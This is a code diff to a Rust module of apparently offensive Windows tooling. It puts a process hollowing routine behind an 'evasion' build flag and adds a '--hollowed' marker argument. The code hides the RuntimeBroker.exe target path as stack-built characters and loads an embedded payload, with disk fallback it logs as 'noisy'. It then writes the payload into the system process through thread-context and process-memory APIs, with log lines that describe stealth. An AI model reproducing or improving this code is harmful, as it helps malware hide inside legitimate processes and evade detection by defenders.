@@ -1,13 +1,20 @@
 #![allow(non_snake_case)]
 
+#[cfg(feature = "evasion")]
 use crate::recovery::helpers::payload::{allow_disk_fallback, get_embedded_payload};
 use crate::recovery::helpers::pe::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER};
+#[cfg(feature = "evasion")]
 use crate::recovery::settings::RecoveryControl;
+#[cfg(feature = "evasion")]
 use crate::stack_str;
+#[cfg(feature = "evasion")]
 use std::env;
 use std::ffi::OsStr;
 use std::os::windows::ffi::OsStrExt;
+#[cfg(feature = "evasion")]
 use tracing::{debug, error, info, warn};
+#[cfg(not(feature = "evasion"))]
+use tracing::debug;
 use windows::Win32::System::Diagnostics::Debug::{
     CONTEXT, CONTEXT_FLAGS, GetThreadContext, SetThreadContext, WriteProcessMemory,
 };
@@ -32,60 +39,66 @@ const IMAGE_REL_BASED_DIR64: u16 = 10;
 const IMAGE_DIRECTORY_ENTRY_BASERELOC: usize = 5;
 
 pub async fn perform_hollowing() -> bool {
-    if !RecoveryControl::global().evasion_enabled() {
-        return false;
-    }
-
-    let args: Vec<String> = env::args().collect();
-    if args.contains(&"--hollowed".to_string()) {
-        debug!("already running in hollowed process");
-        return false;
-    }
-
-    info!("attempting module overloading for stealth");
-
-    let target_str = stack_str!(
-        'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3',
-        '2', '\\', 'R', 'u', 'n', 't', 'i', 'm', 'e', 'B', 'r', 'o', 'k', 'e', 'r', '.', 'e', 'x',
-        'e'
-    );
-    let target = &target_str;
-
-    let payload_bytes = if let Some(bytes) = get_embedded_payload() {
-        debug!("using embedded payload from memory (stealthy)");
-        bytes
-    } else {
-        if !allow_disk_fallback() {
-            error!("embedded payload missing and disk fallback is disabled");
+    #[cfg(feature = "evasion")]
+    {
+        if !RecoveryControl::global().evasion_enabled() {
             return false;
         }
 
-        warn!("falling back to disk read for payload (noisy)");
-        let Ok(current_exe_path) = env::current_exe() else {
+        let args: Vec<String> = env::args().collect();
+        if args.contains(&"--hollowed".to_string()) {
+            debug!("already running in hollowed process");
             return false;
-        };
-        match std::fs::read(&current_exe_path) {
-            Ok(bytes) => bytes,
-            Err(e) => {
-                error!("failed to read payload from disk: {}", e);
+        }
+
+        info!("attempting module overloading for stealth");
+
+        let target_str = stack_str!(
+            'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3',
+            '2', '\\', 'R', 'u', 'n', 't', 'i', 'm', 'e', 'B', 'r', 'o', 'k', 'e', 'r', '.', 'e', 'x',
+            'e'
+        );
+        let target = &target_str;
+
+        let payload_bytes = if let Some(bytes) = get_embedded_payload() {
+            debug!("using embedded payload from memory (stealthy)");
+            bytes
+        } else {
+            if !allow_disk_fallback() {
+                error!("embedded payload missing and disk fallback is disabled");
                 return false;
             }
-        }
-    };
 
-    match run_overloaded(&payload_bytes, target) {
-        Ok(_) => {
-            info!(
-                "successfully overloaded into {}, signaling for exit",
-                target
-            );
-            true
-        }
-        Err(e) => {
-            error!("module overloading failed: {}", e);
-            false
+            warn!("falling back to disk read for payload (noisy)");
+            let Ok(current_exe_path) = env::current_exe() else {
+                return false;
+            };
+            match std::fs::read(&current_exe_path) {
+                Ok(bytes) => bytes,
+                Err(e) => {
+                    error!("failed to read payload from disk: {}", e);
+                    return false;
+                }
+            }
+        };
+
+        match run_overloaded(&payload_bytes, target) {
+            Ok(_) => {
+                info!(
+                    "successfully overloaded into {}, signaling for exit",
+                    target
+                );
+                true
+            }
+            Err(e) => {
+                error!("module overloading failed: {}", e);
+                false
+            }
         }
     }
+
+    #[cfg(not(feature = "evasion"))]
+    false
 }
 
 pub fn run_overloaded(
@@ -103,7 +116,7 @@ pub fn run_overloaded(
             .chain(Some(0))
             .collect();
 
-        let mut command_line: Vec<u16> = OsStr::new(&format!("\"{}\"", target_path))
+        let mut command_line: Vec<u16> = OsStr::new(&format!("\"{}\" --hollowed", target_path))
             .encode_wide()
             .chain(Some(0))
             .collect();
